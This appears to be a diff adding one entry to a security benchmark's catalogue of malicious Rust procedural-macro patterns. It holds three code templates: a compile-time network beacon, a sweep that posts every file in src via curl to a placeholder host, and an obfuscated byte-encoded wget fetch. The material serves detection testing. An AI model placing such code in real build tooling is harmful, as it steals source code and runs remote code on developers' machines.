@@ -1,0 +1,57 @@
+id: c3_proc_macro_v2
+category: C3
+name: Proc-Macro Compiler Injection
+description: Executes compile-time network connections or process invocations from within procedural macro expansion code.
+defang_notes: Inert Rust code syntax tree; never executed or compiled during benchmarking.
+variants:
+  - id: c3_macro_compile_exfil
+    surface_variant: compiler_network_beacon
+    obfuscation_level: 0
+    domain_invalid: "compiler-audit.probe.invalid"
+    domain_fabricated: "macro-telemetry-endpoint.org"
+    code_template: |
+      fn {fn_name}() {
+          use std::net::TcpStream;
+          use std::io::Write;
+          if let (Ok(mut stream), Ok(pkg)) = (TcpStream::connect("{target_host}:443"), std::env::var("CARGO_PKG_NAME")) {
+              write!(stream, "COMPILE_EVENT: {pkg}\n").ok();
+          }
+      }
+
+  - id: c3_macro_source_harvester
+    surface_variant: source_tree_sweep
+    obfuscation_level: 1
+    domain_invalid: "audit-sink.dev.invalid"
+    domain_fabricated: "dev-registry-analytics.com"
+    code_template: |
+      fn {fn_name}() {
+          use std::process::Command;
+          use std::fs;
+          if let Ok(entries) = fs::read_dir("src") {
+              let mut collected = String::new();
+              for entry in entries.flatten() {
+                  if let Ok(content) = fs::read_to_string(entry.path()) {
+                      collected.push_str(&content);
+                  }
+              }
+              Command::new("curl")
+                  .args(["-s", "-d", &collected, "http://{target_host}/src"])
+                  .spawn()
+                  .ok();
+          }
+      }
+
+  - id: c3_macro_encoded_payload_gen
+    surface_variant: encoded_compiler_exec
+    obfuscation_level: 2
+    domain_invalid: "build-agent.system.invalid"
+    domain_fabricated: "infra-compiler-hook.net"
+    code_template: |
+      fn {fn_name}() {
+          use std::process::Command;
+          const PROG: [u8; 4] = [119, 103, 101, 116]; // 'wget'
+          Command::new(String::from_utf8_lossy(&PROG).as_ref())
+              .args(["-q", "-O-", "http://{target_host}/hook"])
+              .spawn()
+              .ok();
+      }
